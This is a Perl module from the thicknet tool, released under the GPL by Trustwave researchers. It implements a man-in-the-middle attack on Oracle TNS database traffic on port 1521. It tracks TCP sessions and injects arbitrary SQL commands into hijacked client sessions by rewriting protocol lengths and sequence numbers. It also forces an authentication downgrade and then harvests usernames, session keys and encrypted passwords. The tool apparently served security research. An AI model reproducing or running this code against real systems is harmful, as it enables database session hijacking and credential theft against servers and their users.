package thicknet::pcap::Oracle;

=header
    thicknet - A tool to manipulate and take control of TCP sessions
	Created by Steve Ocepek and Wendel G. Henrique
	Copyright (C) 2010 Trustwave Holdings, Inc.
 
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
 
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
 
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
=cut

use strict;
use warnings;
use Data::HexDump;
use NetPacket::Ethernet qw(:strip);
use NetPacket::IP  qw(:strip);
use NetPacket::TCP;
use Net::Pcap;
use thicknet::pcap::ARP;
use thicknet::Util;
use AnyEvent;

my $sled_text = "select";

# Data offsets
my $os_srcip = 26;
my $os_dstip = 30;
my $os_srcpt = 34;
my $os_dstpt = 36;
my $os_srcmac = 6;
my $os_dstmac = 0;
my $os_flags = 46;
my $os_seq = 38;
my $os_ack = 42;

# TCP Flags
my $FIN = 0x01;
my $SYN = 0x02;
my $RST = 0x04;
my $PSH = 0x08;
my $ACK = 0x16;

# Pcap vars
my $pcap;
my $err;
my $snaplen = 1600;
my $promisc = 0;
my $to_ms = 15;
my $filter;
my ($address, $netmask);
my %devinfo;
my $index = 1;
my $dev;

my $mymac;
my $myip;
my $sessions;
our $downgrade = 0;

sub inject {
	# Just client->server for now
	my ($session, $cmd) = @_;
	my $ip_obj = NetPacket::IP->decode($session->{sled});

	# Get TCP object from sled (ip_obj)
	my $tcp_obj = NetPacket::TCP->decode($ip_obj->{data});
	
	# Get data
	my $data = $tcp_obj->{data};
	
	# Pack cmd length
	my $cmdlen = pack ('C*', length($cmd));
	
	# Replace Net8 len before sled_text
	# Capture length for use with other length field
	$data =~ s/(.{1})($sled_text)/$cmdlen$2/i;
	my $orig_len = $1;
	
	# OK this keeps shifting around on me, need to look for length field
	# after 035e... skip 10 and hope we don't catch the wrong thing
	$data =~ s/(\x03\x5e.{10,})$orig_len/$1$cmdlen/;
	
	# Change command to supplied value
	# This regex grabs everything from sled_text and beyond until
	# hitting a control char (0x01)
	$data =~ s/$sled_text.*?\x01/$cmd\x01/i;

	# Change TNS length
	my $off_tns_len = 1;
	substr($data, $off_tns_len, 1, pack('C', length($data)));
	
	# Change initial process number - experiment to fix fetch, not working
	# substr($data, 12, 1, pack('C', 0x17));
	
	# Ok now change sequence numbers to latest values, encode and send
	$tcp_obj->{seqnum} = $session->{client_seq};
	$tcp_obj->{acknum} = $session->{server_seq};
	$tcp_obj->{data} = $data;
		
	$ip_obj->{data} = $tcp_obj->encode($ip_obj);
	my $ip_pkt = $ip_obj->encode;
	
	# Mark session for injection
	# We will follow up with Fetch Row commands until all data is transmitted
	$session->{inject} = 1;
	
	# Make the ethernet frame, destined for server
	my $pkt = pack('H12H12n', getmac($session->{server_ip}), $mymac, 0x0800) . $ip_pkt;
	Net::Pcap::pcap_sendpacket($pcap, $pkt);
	# Increment client (our) sequence number
	my $len = length($data);
	$session->{client_seq} += $len;
}

sub attn {
	my ($session) = @_;
	my $ip_obj = NetPacket::IP->decode($session->{sled});
	# Get TCP object from sled (ip_obj)
	my $tcp_obj = NetPacket::TCP->decode($ip_obj->{data});
	$tcp_obj->{seqnum} = $session->{client_seq};
	$tcp_obj->{acknum} = $session->{server_seq};
	# Query for error code using attn number
	$tcp_obj->{data} = pack('C*', 0x00, 0x0b, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x01, 0x00, $session->{attn});
	# Encode
	$ip_obj->{data} = $tcp_obj->encode($ip_obj);
	my $ip_pkt = $ip_obj->encode;
	# Make the ethernet frame, destined for server
	my $pkt = pack('H12H12n', getmac($session->{server_ip}), $mymac, 0x0800) . $ip_pkt;
	Net::Pcap::pcap_sendpacket($pcap, $pkt);
	# Increment client (our) sequence number
	my $len = length($tcp_obj->{data});
	$session->{client_seq} += $len;
	# Did it
	undef($session->{attn});
}

sub ack {
	# Just client->server for now
	my ($session) = @_;
	my $ip_obj = NetPacket::IP->decode($session->{sled});
	
	# Get TCP object from sled (ip_obj)
	my $tcp_obj = NetPacket::TCP->decode($ip_obj->{data});
	
	# Get data
	my $data = $tcp_obj->{data};
	
	# TODO: ensure that packet contains data, or maybe look for PSH
	# if not, don't ACK
	$tcp_obj->{seqnum} = $session->{client_seq};
	$tcp_obj->{acknum} = $session->{server_seq};
	$tcp_obj->{data} = '';
	$tcp_obj->{flags} = ACK;
	$ip_obj->{data} = $tcp_obj->encode($ip_obj);
	my $ip_pkt = $ip_obj->encode;
	# Make the ethernet frame, destined for server
	my $pkt = pack('H12H12n', getmac($session->{server_ip}), $mymac, 0x0800) . $ip_pkt;
	Net::Pcap::pcap_sendpacket($pcap, $pkt);
}

sub fetch_row {
	# Not calling this right now, getting error, need to figure it out
	# Make mine look like theirs.
	my ($session, $serial) = @_;
	my $ip_obj = NetPacket::IP->decode($session->{sled});
	# Get TCP object from sled (ip_obj)
	my $tcp_obj = NetPacket::TCP->decode($ip_obj->{data});
	$tcp_obj->{seqnum} = $session->{client_seq};
	$tcp_obj->{acknum} = $session->{server_seq};
	# Fetch row using serial
	$tcp_obj->{data} = pack('C*', 0x00,0x15,0x00,0x00,0x06,0x00,0x00,0x00,0x00,0x00,0x03,0x05,$serial,0x02,0x00,0x00,0x00,0x0f,0x00,0x00,0x00);
	# Encode
	$ip_obj->{data} = $tcp_obj->encode($ip_obj);
	my $ip_pkt = $ip_obj->encode;
	# Make the ethernet frame, destined for server
	my $pkt = pack('H12H12n', getmac($session->{server_ip}), $mymac, 0x0800) . $ip_pkt;
	Net::Pcap::pcap_sendpacket($pcap, $pkt);
	# Increment client (our) sequence number
	my $len = length($tcp_obj->{data});
	$session->{client_seq} += $len;
}

sub xmit {
	my ($session,$dstip,$pkt) = @_;
	unless ($session->{block}) {
		#substr($pkt, 0, 12, pack('H12H12', getmac($dstip), $mymac));
		# Add eth layer
		$pkt = pack ('H12H12n', getmac($dstip), $mymac, 0x0800) . $pkt;
		Net::Pcap::pcap_sendpacket($pcap, $pkt);
	}
}

sub process_packet {
    # Since this gets executed on every packet, leaner is better
	# And I should probably use NetPacket throughout
	my ($user_data, $header, $pkt) = @_;
	my ($server_mac,$client_mac,$server,$client,$server_port,$client_port,$dir,$new);
	my $session;
	
	my $srcmac = sprintf("%02x%02x%02x%02x%02x%02x",
		ord (substr($pkt, $os_srcmac, 1)),
		ord (substr($pkt, $os_srcmac+1, 1)),
		ord (substr($pkt, $os_srcmac+2, 1)),
		ord (substr($pkt, $os_srcmac+3, 1)),
		ord (substr($pkt, $os_srcmac+4, 1)),
		ord (substr($pkt, $os_srcmac+5, 1))
		);
	
	my $dstmac = sprintf("%02x%02x%02x%02x%02x%02x",
		ord (substr($pkt, $os_dstmac, 1)),
		ord (substr($pkt, $os_dstmac+1, 1)),
		ord (substr($pkt, $os_dstmac+2, 1)),
		ord (substr($pkt, $os_dstmac+3, 1)),
		ord (substr($pkt, $os_dstmac+4, 1)),
		ord (substr($pkt, $os_dstmac+5, 1))
		);
	
	my $srcip = sprintf("%02x%02x%02x%02x",
		ord (substr($pkt, $os_srcip, 1)),
		ord (substr($pkt, $os_srcip+1, 1)),
		ord (substr($pkt, $os_srcip+2, 1)),
		ord (substr($pkt, $os_srcip+3, 1)));

	my $dstip = sprintf("%02x%02x%02x%02x",
		ord (substr($pkt, $os_dstip, 1)),
		ord (substr($pkt, $os_dstip+1, 1)),
		ord (substr($pkt, $os_dstip+2, 1)),
		ord (substr($pkt, $os_dstip+3, 1)));
	
	my $srcport = unpack("n", (substr($pkt, $os_srcpt, 2)));
	my $dstport = unpack("n", (substr($pkt, $os_dstpt, 2)));
	my $flags = (unpack("n", (substr($pkt, $os_flags, 2)))) & 0x00ff;
	
	# ackack session tracking
	# Only do guesswork if no record exists already
	if ($sessions->{"$srcip:$srcport:$dstip:$dstport"}) {
		$session = $sessions->{"$srcip:$srcport:$dstip:$dstport"};
		$client = $srcip;
		$server = $dstip;
		$client_port = $srcport;
		$server_port = $dstport;
		$dir = 1;
		$new = 0;
	}
	elsif ($sessions->{"$dstip:$dstport:$srcip:$srcport"}) {
		$session = $sessions->{"$dstip:$dstport:$srcip:$srcport"};
		$client = $dstip;
		$server = $srcip;
		$client_port = $dstport;
		$server_port = $srcport;
		$dir = 0;
		$new = 0;
	}
	else {
		# New session
		# Whatever is 1521 is Oracle server for now
		# dir - 0 = server->client, 1 = client->server
		if ($srcport == 1521) {($server,$client,$server_port,$client_port,$dir) = ($srcip,$dstip,$srcport,$dstport,0);}
		if ($dstport == 1521) {($client,$server,$client_port,$server_port,$dir) = ($srcip,$dstip,$srcport,$dstport,1);}
		# Set it
		# Each entry is anonymous hash
		$sessions->{"$client:$client_port:$server:$server_port"} = {};
		# $session is shortcut to current session
		$session = $sessions->{"$client:$client_port:$server:$server_port"};
		# Create hash elements
		$session->{client_seq} = 0;
		$session->{server_seq} = 0;
		# Store each IP in hex
		$session->{client_ip} = $client;
		$session->{server_ip} = $server;
		# Denote as new connection
		$new = 1;
	}
	
	my $seq = sprintf("%02x%02x%02x%02x",
		ord (substr($pkt, $os_seq, 1)),
		ord (substr($pkt, $os_seq+1, 1)),
		ord (substr($pkt, $os_seq+2, 1)),
		ord (substr($pkt, $os_seq+3, 1)));
	
	my $ack = sprintf("%02x%02x%02x%02x",
		ord (substr($pkt, $os_ack, 1)),
		ord (substr($pkt, $os_ack+1, 1)),
		ord (substr($pkt, $os_ack+2, 1)),
		ord (substr($pkt, $os_ack+3, 1)));
	
	my $pkt_ip = eth_strip($pkt);
	my $ip_obj = NetPacket::IP->decode($pkt_ip);
	my $tcp_obj = NetPacket::TCP->decode(ip_strip($pkt_ip));
	
	# Data length = Length in IP header minus IP header size and TCP header size
	# hlen expressed in 32-bit words (4 bytes)
	my $len = $ip_obj->{len} - ($ip_obj->{hlen} * 4 + $tcp_obj->{hlen} * 4);
	
	# Track sequence numbers of server / client
	if ($dir) {
		$session->{client_seq} = $tcp_obj->{seqnum} + $len;
	} else {
		$session->{server_seq} = $tcp_obj->{seqnum} + $len;
	}
	my $data = $tcp_obj->{data};
	# If sled isn't set yet, test packets till you find one
	unless ($session->{sled}) {
		# CASE INSENSITIVE?
		if ($data =~ m/$sled_text/i) {
			#sled debug
			#print "SLED FOUND!\n";
			#open (fh, '>sled.bin');
			#print fh $data;
			#close fh;
			$session->{sled} = $pkt_ip;
		}
	}
	if ($session->{examine}) {
		print "$srcip:" . $tcp_obj->{src_port} . " / $srcmac -> $dstip:" . $tcp_obj->{dest_port} . " / $dstmac flags: " . $tcp_obj->{flags} . " new: $new seq: " . $tcp_obj->{seqnum} . " ack: " . $tcp_obj->{acknum} . " len: $len\n";
		print HexDump $data;
	}

	# Send it to the right place unless it's being blocked (injection)
	if (($session->{block}) and ($dir == 0)) {
		# Watch out for Attention packets, need to respond
		# These occur when the client (us) sends a bad request
		my $len = length($data);
		if ($len == 11) {
			if (ord (substr($data, 4, 1)) == 0x0c) {
				$session->{attn} = ord (substr($data, 10, 1));
				attn($session);
			}
		}

=begin future stuff that doesn't work yet
		if ($session->{inject}) {
			# Test whether last data packet
			if ($data =~ m/'no data found'/s) {
				undef ($session->{inject});
			}
			else {
				# Find serial
				$data =~ m{.*\x01}sg;
				my $pos = (pos($data) - 4);
				print "pos is $pos\n";
				my $serial = ord(substr($data, $pos, 1));
				#my $serial = 0x16;
				# Fetch next row using serial + 1
				# Testing theory...
				$serial++;
				print "doing fetch on $serial\n";
				fetch_row($session, $serial);
			}	
		}
=cut
		
		# Server is sending data, need to respond
		# Only ack if PSH is set
		unless ($session->{attn}) {
			if ($flags & 0x08 == 0x08) {
				ack($session);
			}
		}
	}

	# Downgrade checks
	if ($downgrade == 1) {
		# Dir 1 - client to server
		if ($dir == 1) {
			# If TNS considers this data
			unless ($session->{down}) {
				if (length($data) >= 4) {
					if (ord (substr($data, 4, 1)) == 0x06) {
						if ($data =~ s/\x00\x00\x01\x06\x05\x04\x03\x02\x01\x00/\x00\x00\x01\x05\x05\x04\x03\x02\x01\x00/) {
							# Encode
							$tcp_obj->{data} = $data;
							$ip_obj->{data} = $tcp_obj->encode($ip_obj);
							$pkt = $ip_obj->encode;
							xmit($session, $session->{server_ip}, $pkt); 
							print "\nDowngrade performed for Client: " . hex2ip($session->{client_ip}) . " Server: " . hex2ip($session->{server_ip}) . "\n";
							$session->{down} = 1;
						}
					}
				}
			}
		}
	
		if ($session->{down}) {
			unless ($session->{user}) {
				if ($data =~ m/(\w+)[[:cntrl:]]+AUTH_TERMINAL/) {
					print "user is $1\n";
					$session->{user} = $1;
				}
			}
			unless ($session->{auth_srv_sesskey}) {
				if ($data =~ m/AUTH_SESSKEY[[:cntrl:]]+(\w{16})/) {
					print "auth_srv_sesskey is $1\n";
					$session->{auth_srv_sesskey} = $1;
				}
			}
			unless ($session->{auth_password}) {
				if ($data =~ m/AUTH_PASSWORD[[:cntrl:]]+(\w{16})/) {
					print "auth_password is $1\n";
					$session->{auth_password} = $1;
				}
			}
		}
	}

	unless ($session->{block}) {
		substr($pkt, 0, 12, pack('H12H12', getmac($dstip), $mymac));
		Net::Pcap::pcap_sendpacket($pcap, $pkt);
	}
}

sub init {
	my %args = (
		myip		=> undef,
		mymac		=> undef,
		dev			=> undef,
		sessions	=> undef,
		@_
	);
	
	$myip = $args{myip};
	$mymac = $args{mymac};
	$dev = $args{dev};
	$sessions = $args{sessions};
	
	#Get packets to our mac but not our ip
	my $filter_str = "tcp and port 1521 and ether dst $mymac and ip dst not $myip";
	# Get net info for device to create filter
	if (Net::Pcap::lookupnet($dev, \$address, \$netmask, \$err)) {
	    die 'Unable to look up device information for ', $dev, ' - ', $err;
	}

	# Open device
	$pcap = Net::Pcap::open_live($dev, $snaplen, $promisc, $to_ms, \$err);
	unless ($pcap) {
	    die "Error opening live: $err\n";
	}

	# Non-blocking mode offers dramatic speed increase but
	# don't set it on Windows due to high CPU utilization
	unless ($^O eq 'MSWin32') {
	        Net::Pcap::pcap_setnonblock($pcap, 1, \$err);
	}

	# Compile and set filter
	Net::Pcap::compile($pcap, \$filter, $filter_str, 1, $netmask) &&
	    die 'Unable to compile packet capture filter';
	Net::Pcap::setfilter($pcap, $filter) &&
	    die 'Unable to set packet capture filter';
	
	my $pcaploop = AnyEvent->timer (after => 0, interval => .001, cb => sub {
		Net::Pcap::pcap_dispatch($pcap, 1, \&process_packet, "user data");
	});
	
	return $pcaploop;
}

1;
